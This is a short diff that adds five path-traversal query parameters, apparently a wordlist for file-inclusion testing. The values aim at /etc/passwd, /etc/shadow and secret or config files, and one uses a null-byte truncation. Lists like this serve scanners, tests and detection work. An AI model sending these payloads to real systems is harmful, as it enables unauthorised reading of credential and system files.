@@ -1,0 +1,5 @@
+?config=../etc/passwd
+?theme=../../secret
+?lang=../../../../etc/passwd%00
+?locale=../../config
+?template=../../etc/shadow
